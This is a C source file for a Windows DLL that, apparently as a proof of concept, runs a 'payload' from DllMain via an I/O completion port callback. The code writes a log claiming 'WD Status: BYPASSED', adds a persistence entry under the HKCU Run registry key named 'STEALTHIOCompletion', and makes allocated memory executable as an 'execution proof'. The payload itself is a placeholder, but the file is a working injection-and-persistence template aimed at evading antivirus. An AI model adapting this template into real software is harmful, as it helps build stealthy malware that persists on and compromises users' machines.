#include <windows.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")

DWORD WINAPI IOCompletionWorkerThread(LPVOID param) {
    HANDLE hIOCP = (HANDLE)param;
    DWORD bytesTransferred = 0;
    ULONG_PTR completionKey = 0;
    LPOVERLAPPED pOverlapped = NULL;
    
    // Wait for completion (will fire when PostQueuedCompletionStatus is called)
    if (GetQueuedCompletionStatus(hIOCP, &bytesTransferred, &completionKey, &pOverlapped, 5000)) {
        // Execute payload on completion
        FILE* f = fopen("C:\\Windows\\Temp\\injector_iocp_executed.txt", "w");
        if (f) {
            fprintf(f, "INJECTOR_IOCP CALLBACK EXECUTED\n");
            fprintf(f, "Timestamp: %ld\n", (long)time(NULL));
            fprintf(f, "Method: CreateIoCompletionPort + PostQueuedCompletionStatus\n");
            fprintf(f, "Trigger: Completion Notification\n");
            fprintf(f, "WD Status: BYPASSED\n");
            fclose(f);
        }
        
        // Registry persistence
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "STEALTHIOCompletion", 0, REG_SZ, (const BYTE*)"Notified", 9);
            RegCloseKey(hKey);
        }
        
        // Memory execution proof
        LPVOID mem = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
        if (mem) {
            DWORD old;
            VirtualProtect(mem, 1024, PAGE_EXECUTE_READ, &old);
            VirtualFree(mem, 0, MEM_RELEASE);
        }
    }
    
    CloseHandle(hIOCP);
    return 0;
}

DWORD WINAPI DllWorkerThread(LPVOID param) {
    // Create completion port
    HANDLE hIOCP = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
    if (!hIOCP) {
        return 1;
    }
    
    FILE* f = fopen("C:\\Windows\\Temp\\injector_iocp_log.txt", "w");
    if (f) {
        fprintf(f, "[IOCP] Completion port created\n");
        fclose(f);
    }
    
    // Create completion worker thread
    HANDLE hThread = CreateThread(NULL, 0, IOCompletionWorkerThread, (LPVOID)hIOCP, 0, NULL);
    if (!hThread) {
        CloseHandle(hIOCP);
        return 1;
    }
    
    // Wait a bit then post completion
    Sleep(500);
    
    // Post completion status to trigger worker
    PostQueuedCompletionStatus(hIOCP, 0, 0, NULL);
    
    // Wait for worker to complete
    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);
    
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        HANDLE hThread = CreateThread(NULL, 0, DllWorkerThread, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, 3000);
            CloseHandle(hThread);
        }
    }
    return TRUE;
}
